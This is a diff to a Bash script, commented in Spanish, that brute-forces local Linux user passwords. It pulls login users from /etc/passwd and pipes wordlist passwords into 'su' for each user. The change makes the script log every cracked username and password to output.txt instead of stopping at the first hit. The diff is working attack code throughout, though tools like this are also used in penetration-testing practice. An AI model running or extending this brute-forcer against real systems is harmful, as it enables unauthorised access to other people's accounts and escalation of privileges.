@@ -32,7 +32,7 @@ check_fun(){
 }
 # Obtenemos los usuarios filtrando por las shells y home
 
-cat /etc/passwd | grep -E "bash|dash|zsh|ksh|fish|home" | sed 's/:/ /g' | awk '{print $1}' > users.txt
+cat /etc/passwd | grep "sh$" | sed 's/:/ /g' | awk '{print $1}' > users.txt
 check_fun
 
 # Fuerza a los usuarios
@@ -41,15 +41,17 @@ trap salir SIGINT
 
 lineas=$(wc -l $passwords_list | awk '{print $1}')
 intentos=0
+touch output.txt
 
 while IFS= read -r pass; do
   while IFS= read -r user; do
     echo -e "${verde}[${rojo}*${verde}]${rojo} Probando... $intentos${amarillo}/${rojo}$lineas${reset}"
     if timeout 0.5 bash -c "echo '$pass' | su $user" > /dev/null 2>&1; then
       clear
-      echo -e "${verde}[${rojo}✓${verde}]${amarillo} Contraseña ${rojo}$pass${amarillo} encontrada para el usuario ${rojo}$user${reset}"
-      rm ./users.txt
-      exit 0
+      echo -e "[✓] Contraseña $pass encontrada para el usuario $user" >> output.txt
+      cat users.txt | grep -v "$user" > users.txt.tmp
+      rm users.txt
+      mv users.txt.tmp users.txt
     fi
     clear
   done < "./users.txt"
@@ -57,5 +59,5 @@ while IFS= read -r pass; do
 done < "$passwords_list"
 
 clear
-echo -e "${rojo}[-] No se encontró la contraseña${reset}"
+echo -e "${rojo}[+] Se guardó el reporte en ./output.txt${reset}"
 rm ./users.txt
